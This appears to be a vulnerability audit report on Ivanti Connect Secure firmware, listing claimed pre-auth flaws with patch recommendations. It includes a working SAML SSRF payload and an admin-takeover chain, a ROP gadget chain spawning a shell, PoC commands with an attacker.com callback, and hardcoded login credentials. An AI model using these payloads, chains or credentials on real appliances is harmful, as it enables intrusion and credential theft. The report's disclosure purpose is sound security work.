
# Ivanti Connect Secure (ICS) Deep Security Audit Report

**Firmware Versions Analyzed**: 22.7R2.3 (b3431), 22.7R2.8 (b4471), 22.8R2.2 (b18481)
**Scope**: Pre-authentication (zero-auth) Remote Code Execution
**Methodology**: Static reverse engineering + dynamic testing on QEMU lab
**Period**: 2026-03

---

## Executive Summary

Deep binary-level reverse engineering of three Ivanti ICS firmware versions identified **multiple zero-day security vulnerabilities** and **systemic binary hardening deficiencies**. While no single-step zero-authentication RCE chain was confirmed end-to-end, the findings represent significant security risks, particularly when combined:

| ID | Finding | Severity | Pre-Auth | Version |
|----|---------|----------|----------|---------|
| ZD-01 | EAP-over-HTTP OOB Read (Missing Length Validation) | High | Yes | R2.3 |
| ZD-02 | ObjectTag::rewrite sprintf Stack Overflow | Critical | No (Web Proxy) | All |
| ZD-03 | saml-endpoint.cgi Unsafe Taint-Washing Regex | Medium | Yes* | R2.3, R2.8 |
| ZD-04 | SAML Pre-Signature Data Processing | High | Yes* | R2.2 |
| ZD-05 | Systemic Binary Hardening Deficiency | High | N/A | R2.3 |
| ZD-06 | Hardcoded Watchdog Credentials | Medium | Yes | All |
| ZD-07 | generateRandomToken 32-bit Entropy | Medium | N/A | R2.3 |
| ZD-08 | Login.cgi X-Forwarded-For IP Spoofing | Medium | Yes | R2.3 |
| ZD-09 | OAuth Consumer SSRF to Internal OIDC | Medium | Yes* | R2.3 |
| ZD-10 | REST API RBAC Bypass (No Enable-Rbac Header) | Critical | No† | All |
| ZD-11 | JWT Signature Not Verified (verify=False) | Critical | No† | All |
| ZD-12 | Flask Auth Bypass via /api/my-session Prefix | High | Yes | All |
| ZD-13 | ZTA Gateway isGateway() Auth Skip | High | Yes‡ | All |
| ZD-14 | dmi.py Argument Injection via REST API | Critical | No† | All |
| ZD-15 | License Proto Pre-Auth + Empty Password Bypass | High | Yes | All |
| ZD-16 | OAuth OIDC Open Redirect via State Reflection | Medium | Yes* | All |
| ZD-17 | SAML SSRF → Internal REST API (xmltooling 3.2.0 unpatched) | Critical | Yes | R2.8 |

*Requires specific configuration (SAML/OIDC enabled)
†Requires internal network access or SSRF to localhost
‡Requires ZTA gateway mode
ZD-17: saml-logout.cgi works without any SAML configuration on target

---

## ZD-17: SAML SSRF → Internal REST API Access (xmltooling 3.2.0 Unpatched)

### Affected: 22.7R2.8 (build 4471) — confirmed

**Endpoint**: `/dana-na/auth/saml-logout.cgi` (PRE-AUTH, no SAML configuration required)
**Also**: `/dana-na/auth/saml-consumer.cgi` (PRE-AUTH, POST binding)

**CVSS**: 9.1 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)

### Root Cause

R2.8 ships `libxmltooling.so.10.0.0` version **3.2.0**. The Shibboleth security advisory (2023-06-12) documents that xmltooling < 3.2.4 will dereference untrusted URLs found in `<RetrievalMethod URI="...">` elements within XML Signature `KeyInfo` blocks. The fix (3.2.4+) blocks this dereference.

Confirmed via binary analysis:
```
$ strings libxmltooling.so.10.0.0 | grep "xmltooling "
xmltooling 3.2.0          <- vulnerable, fix requires 3.2.4+

$ strings libxmltooling.so.10.0.0 | grep -i "RetrievalMethod"
_ZNK12xmlsignature19RetrievalMethodImpl6getURIEv    <- symbol present, functional
_ZN12xmlsignature22RetrievalMethodBuilder11buildObjectEv
```

### Attack Path

`saml-logout.cgi` calls `DSAuth::SAMLConsumer::process()` -> `saml-server` binary -> `xmltooling::ValidatorSuite::validate()` -> `libxmltooling.so` -> libcurl GET to attacker-controlled URI.

Since internal REST services bind exclusively to `127.0.0.1:8090`, the SSRF bypasses the `web` binary proxy auth layer entirely.

```
Attacker (WAN)
    |
    |  GET /dana-na/auth/saml-logout.cgi?SpId=1&SAMLResponse=<payload>
    v
web binary (443) --> saml-logout.cgi --> DSAuth::SAMLConsumer::process()
                                              |
                                              v
                                    saml-server binary
                                              |
                                              v
                                    xmltooling::ValidatorSuite::validate()
                                              |
                                              v  libcurl GET
                                    http://127.0.0.1:8090/api/v1/configuration/
                                              |
                                              v
                                    restservice (uWSGI, no auth required)
                                              |
                                              v
                                    Full system config JSON
```

### SAML Payload

```xml
<?xml version="1.0" encoding="UTF-8"?>
<samlp:LogoutResponse xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" Version="2.0">
   <Signature xmlns="http://www.w3.org/2000/09/xmldsig#">
      <SignedInfo>
         <CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#" />
         <SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha256" />
      </SignedInfo>
      <SignatureValue>x</SignatureValue>
      <KeyInfo>
         <RetrievalMethod URI="http://127.0.0.1:8090/api/v1/configuration/">
         </RetrievalMethod>
      </KeyInfo>
   </Signature>
</samlp:LogoutResponse>
```

Compress with raw deflate, base64 encode, send as `SAMLResponse` GET parameter.

### High-Value SSRF Targets (127.0.0.1:8090)

| Endpoint | Method | Impact |
|----------|--------|--------|
| `/api/v1/configuration/` | GET | Full system config (LDAP passwords, API keys, certs) |
| `/api/v1/configuration/auth` | GET | Auth server configs with credentials |
| `/api/v1/configuration/network` | GET | Network configuration |
| `/api/v1/system/active-users` | GET | Active session DSIDs -> session hijack |
| `/api/v1/system/auth/auth-server/<name>/users` | GET | User enumeration |
| `/api/v1/system/binary-configuration` | PUT | Binary config import |

### Combination Chain: ZD-17 + ZD-11 -> Pre-Auth Admin Takeover

```
Step 1: ZD-17 SSRF -> GET /api/v1/system/active-users
        -> Leak active admin session DSID values

Step 2: Use leaked DSID cookie to authenticate as admin
        -> Full administrative access without credentials

Step 3 (alternative): ZD-17 SSRF -> GET /api/v1/configuration/auth
        -> Extract LDAP bind password or local admin password hash
        -> Crack hash offline -> authenticate as admin
```

### Why saml-logout.cgi is More Reliable

`saml-consumer.cgi` requires SAML to be configured on the target. `saml-logout.cgi` processes the SAML signature regardless of SAML configuration state — the xmltooling validation runs before any SAML config check, making it universally exploitable on any R2.8 deployment.

### PoC

See `exploit_chain/poc_saml_ssrf_r28.py`

```bash
# Confirm SSRF with OOB server
python3 poc_saml_ssrf_r28.py --target 10.0.0.1 --oob http://attacker.com/

# Read auth server configuration (credentials)
python3 poc_saml_ssrf_r28.py --target 10.0.0.1 --path auth

# Enumerate active sessions
python3 poc_saml_ssrf_r28.py --target 10.0.0.1 --internal-path /api/v1/system/active-users
```

### Patch Recommendation

Upgrade `libxmltooling` to version 3.2.4 or later. The fix adds a blocklist for `RetrievalMethod` URI dereferencing in signature validation context.

---

## ZD-01: EAP-over-HTTP Out-of-Bounds Read

### Affected: 22.7R2.3 (Fixed in 22.7R2.8)

**Endpoint**: `/dana-na/auth/eap-o-http` (PRE-AUTH, no authentication required)

**Root Cause**: The EAP packet length field (16-bit, offset +2) is parsed and used to control a `memmove()` operation with only a lower-bound check (`cmp ax, 5`). No upper bound check exists, allowing values up to 65535, resulting in `data_length = EAP_Length - 5 = 65530` bytes read beyond the allocated buffer.

**R2.8 Fix**: Added `cmp edi, 0x1000` (4096-byte upper limit) at `0x000dca10`.

---

## ZD-02: ObjectTag::rewrite sprintf Stack Buffer Overflow

### Affected: All versions

**Vulnerable Function**: `ObjectTag::rewrite()` in `libdsplibs.so`

**Root Cause**: `sprintf()` with `%s` format writes user-controlled URL into dynamically-sized stack buffer. saml-server (22.8R2.2): NO Canary, NO PIE (base 0x08048000).

**ROP Chain** (saml-server 22.8R2.2):
```
pop ebx @ 0x080b3ac5 -> "/bin/sh" @ 0x0820d701
pop ecx @ 0x08173773 -> 0x0 (NULL argv)
pop edx @ 0x0804db3f -> 0x0 (NULL envp)
mov eax,0xb @ 0x0814c950 (SYS_execve)
int 0x80 @ 0x0804b3e8
```

**Limitation**: Requires authenticated Web Proxy session.

---

## ZD-03: saml-endpoint.cgi Unsafe Taint-Washing Regex

### Affected: 22.7R2.3, 22.7R2.8

**Root Cause**: Regex `[a-zA-Z0-9 \/.\-\_|]` includes pipe `|` character as taint-washing pattern. Blocked by `DSSafe::popen()` metachar check, but represents defense-in-depth failure.

---

## ZD-04: SAML Pre-Signature Data Processing

### Affected: 22.8R2.2

**Root Cause**: saml-server processes 690+ instructions of attacker-controlled SAML XML (XMLString::transcode, memcpy, dynamic_cast, vtable calls) before signature verification at `0x080fd2e8`. NO Canary + NO PIE = exploitable.

---

## ZD-05: Systemic Binary Hardening Deficiency

### Affected: 22.7R2.3

All network-facing binaries (web, saml-server, proxy-server, rewrite-server, browse-server, filter-server, cache_server, sessionserver, dslogserver) lack stack canaries. saml-server, proxy-server, rewrite-server also lack PIE.

---

## ZD-06: Hardcoded Watchdog Credentials

### Affected: All versions

`login.cgi`: user=`neoteriswatchdogprocess`, password=`danastreet`. Returns HTTP 200 empty body, no session created.

---

## ZD-07: generateRandomToken 32-bit Entropy

### Affected: 22.7R2.3

`unpack("h8", $randBytes)` extracts only 4 bytes (32 bits) from 16 bytes of urandom.

---

## ZD-08: Login.cgi X-Forwarded-For IP Spoofing

### Affected: 22.7R2.3

`CUSTOM_REMOTE_ADDR` derived from spoofable `X-Forwarded-For` header. Used for failed login recording and CSRF bypass (localhost source skips CSRF check).

---

## ZD-09: OAuth Consumer SSRF

### Affected: 22.7R2.3

`oauth-consumer.cgi`: `state` parameter concatenated directly into `http://localhost:7300/api/v1/oidc/targeturlrequest?state=<STATE>`.

---

## ZD-10: REST API RBAC Bypass

### Affected: All versions

`checkPermission()` returns `None` (allow) when `Enable-Rbac` header absent. Any caller reaching `127.0.0.1:8090` without this header gets unrestricted access to all REST endpoints.

---

## ZD-11: JWT Signature Not Verified

### Affected: All versions

`aaatoken.py`: `jwt.decode(token, verify=False)`. Two bypass paths: (1) no token = pass, (2) forged token accepted. Source comment: `#Verify only tenant id for now. Signature validation is todo`

---

## ZD-12: Flask Auth Bypass via /api/my-session Prefix

### Affected: All versions

`POST /api/my-session/changepassword` reachable pre-auth. No-DSID path forwards password change to CMS without session validation.

---

## ZD-13: ZTA Gateway isGateway() Auth Skip

### Affected: All versions (ZTA gateway mode)

`if DSSDP.isGateway(): return 1` — skips all JWT validation in ZTA gateway mode.

---

## ZD-14: dmi.py Argument Injection

### Affected: All versions

`PUT /api/v1/system/binary-configuration?password=<value>` — password passed to `backupHandler.pl` via `args.split()` without sanitization. Requires ZD-10.

---

## ZD-15: License Proto Pre-Auth

### Affected: All versions

`POST /dana-na/licenseserver/licenseserverproto.cgi` — pre-auth protobuf processing. Empty password produces different response than wrong password (information disclosure).

---

## ZD-16: OAuth OIDC Open Redirect

### Affected: All versions (OIDC configured)

`state` parameter reflected in OIDC error response, extracted and used as redirect URL. Pre-auth open redirect to arbitrary external URL.

---

## Recommendations

1. Upgrade **xmltooling to >= 3.2.4** (ZD-17 — blocks RetrievalMethod SSRF)
2. Enable **stack canaries** for all binaries, especially saml-server
3. Enable **PIE** for saml-server (currently fixed base 0x08048000)
4. Fix **JWT verification**: replace `jwt.decode(verify=False)` with proper signature check
5. Fix **RBAC bypass**: enforce auth when `Enable-Rbac` header absent
6. Add **EAP packet length upper bound** (R2.3 deployments)
7. Verify **SAML signature before data processing** in saml-server
8. Sanitize **password parameter** in binary-configuration endpoint
9. Validate **OIDC state parameter** before redirect
10. Remove **hardcoded watchdog credentials**
11. Fix **X-Forwarded-For** handling in login.cgi
12. Increase **token entropy** to full 128 bits
